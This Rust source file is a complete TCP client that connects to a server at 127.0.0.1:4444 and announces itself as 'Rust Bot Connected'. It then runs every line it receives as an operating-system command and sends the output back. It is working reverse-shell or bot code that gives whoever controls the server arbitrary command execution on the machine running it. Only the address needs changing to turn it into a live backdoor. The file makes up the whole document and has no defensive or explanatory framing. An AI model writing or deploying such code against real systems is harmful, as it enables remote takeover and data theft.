use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> std::io::Result<()> {
    println!("Connecting to server at 127.0.0.1:4444...");

    // Connect to the server
    let mut stream = match TcpStream::connect("127.0.0.1:4444") {
        Ok(stream) => {
            println!("Connected to server!");
            stream
        }
        Err(e) => {
            eprintln!("Failed to connect to server: {}", e);
            return Err(e);
        }
    };

    // Clone the stream for reading and writing
    let mut reader = BufReader::new(stream.try_clone()?);
    let mut writer = stream;

    // Send initial identification
    writeln!(writer, "Rust Bot Connected")?;
    writer.flush()?;

    // Continuously listen for commands
    loop {
        let mut command_line = String::new();

        // Read command from server
        match reader.read_line(&mut command_line) {
            Ok(0) => {
                // Connection closed by server
                println!("Server closed connection");
                break;
            }
            Ok(_) => {
                // Remove newline characters
                let command_line = command_line.trim();

                if command_line.is_empty() {
                    continue;
                }

                println!("Received command: {}", command_line);

                // Execute the command
                let output = execute_command(command_line);

                // Send result back to server
                if let Err(e) = send_result(&mut writer, &output) {
                    eprintln!("Failed to send result: {}", e);
                    break;
                }
            }
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        }
    }

    Ok(())
}

fn execute_command(command_line: &str) -> String {
    // Split the command into parts
    let parts: Vec<&str> = command_line.split_whitespace().collect();

    if parts.is_empty() {
        return "Empty command".to_string();
    }

    let command = parts[0];
    let args = &parts[1..];

    // Execute the command
    match Command::new(command)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            if output.status.success() {
                if stdout.is_empty() && stderr.is_empty() {
                    "Command executed successfully (no output)".to_string()
                } else {
                    format!("{}\n{}", stdout, stderr).trim().to_string()
                }
            } else {
                format!("Command failed with exit code {:?}\n{}", 
                       output.status.code(), stderr)
            }
        }
        Err(e) => {
            format!("Failed to execute command: {}", e)
        }
    }
}

fn send_result(writer: &mut std::net::TcpStream, result: &str) -> std::io::Result<()> {
    // Send the result back to the server
    writeln!(writer, "{}", result)?;
    writer.flush()?;
    Ok(())
}

